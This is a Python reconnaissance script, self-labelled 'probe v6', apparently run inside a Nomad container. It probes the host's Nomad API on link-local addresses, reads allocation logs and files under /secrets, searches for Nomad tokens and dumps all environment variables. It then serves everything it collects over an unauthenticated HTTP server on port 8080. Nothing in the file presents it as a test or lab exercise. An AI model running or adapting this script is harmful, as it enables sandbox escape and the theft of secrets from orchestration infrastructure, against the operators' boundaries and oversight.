import http.server
import urllib.request
import json
import os
import socket
import ssl
import subprocess

results = {}

def run_cmd(name, cmd, timeout=10):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
        results[name] = {"stdout": r.stdout[:8000], "stderr": r.stderr[:500]}
    except Exception as e:
        results[name] = {"error": str(e)}

def read_file(name, path, max_bytes=8000):
    try:
        with open(path, 'rb') as f:
            data = f.read(max_bytes)
            try:
                results[name] = data.decode('utf-8')
            except:
                results[name] = data.hex()[:8000]
    except Exception as e:
        results[name] = str(e)

# 1. NOMAD API ON HOST - Try various approaches
# GET requests (Nomad API is typically GET for reads)
run_cmd("nomad_get_agent", "curl -sk -m 5 http://169.254.1.2:4646/v1/agent/self 2>&1")
run_cmd("nomad_get_agent_https", "curl -sk -m 5 https://169.254.1.2:4646/v1/agent/self 2>&1")
run_cmd("nomad_get_jobs", "curl -sk -m 5 http://169.254.1.2:4646/v1/jobs 2>&1")
run_cmd("nomad_get_allocs", "curl -sk -m 5 http://169.254.1.2:4646/v1/allocations 2>&1")
run_cmd("nomad_get_nodes", "curl -sk -m 5 http://169.254.1.2:4646/v1/nodes 2>&1")
run_cmd("nomad_get_status", "curl -sk -m 5 http://169.254.1.2:4646/v1/status/leader 2>&1")
run_cmd("nomad_root", "curl -sk -m 5 -v http://169.254.1.2:4646/ 2>&1")

# Try with HTTP/1.0 and different methods
run_cmd("nomad_http10", "curl -sk -m 5 --http1.0 http://169.254.1.2:4646/v1/agent/self 2>&1")

# HTTPS with different TLS settings
run_cmd("nomad_https_tls12", "curl -sk --tlsv1.2 -m 5 https://169.254.1.2:4646/v1/agent/self 2>&1")

# 2. READ ALL ALLOCATION LOGS
for logfile in ["pod.stderr.0", "pod.stdout.0", "sidecar.stdout.0", "sidecar.stderr.0",
                "preflight.stderr.0", "preflight.stdout.0", "run.stderr.0", "run.stdout.0"]:
    read_file(f"alloc_log_{logfile}", f"/alloc/logs/{logfile}")

# 3. List everything in /alloc
run_cmd("alloc_tree", "find /alloc -type f 2>/dev/null | head -50")
run_cmd("alloc_data", "ls -la /alloc/ 2>/dev/null && ls -la /alloc/data/ 2>/dev/null")

# 4. Check /local directory (Nomad local dir)
run_cmd("local_tree", "find /local -type f 2>/dev/null | head -50")

# 5. Check .nomad-mount in detail (sometimes contains Nomad token)
run_cmd("nomad_mount_hex", "xxd /secrets/.nomad-mount 2>&1 | head -5")

# 6. Try accessing Nomad with different port (HTTPS on 4646)
run_cmd("nomad_4647", "curl -sk -m 5 http://169.254.1.2:4647/ 2>&1")
run_cmd("nomad_4648", "curl -sk -m 5 http://169.254.1.2:4648/ 2>&1")

# 7. Check all env vars including Nomad-related
results["all_env"] = dict(os.environ)

# 8. Check if NOMAD_TOKEN or NOMAD_ADDR is set anywhere
run_cmd("find_nomad_ref", "grep -r 'NOMAD\|nomad' /secrets/ /alloc/ /local/ 2>/dev/null | head -20")

# 9. Network check - what exactly is on 4646
run_cmd("nc_nomad", "echo '' | nc -w 3 169.254.1.2 4646 2>&1 | head -c 500 || true")

# 10. Try Python urllib approach to Nomad 
import urllib.request
try:
    req = urllib.request.Request("http://169.254.1.2:4646/v1/agent/self")
    resp = urllib.request.urlopen(req, timeout=5)
    results["nomad_python"] = {"status": resp.status, "data": resp.read().decode()[:4000], "headers": dict(resp.headers)}
except Exception as e:
    results["nomad_python"] = {"error": str(e)}

try:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request("https://169.254.1.2:4646/v1/agent/self")
    resp = urllib.request.urlopen(req, timeout=5, context=ctx)
    results["nomad_python_https"] = {"status": resp.status, "data": resp.read().decode()[:4000], "headers": dict(resp.headers)}
except Exception as e:
    results["nomad_python_https"] = {"error": str(e)}

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(results, indent=2, default=str).encode())
    def log_message(self, *args):
        pass

print("Starting probe v6 on port 8080...")
http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
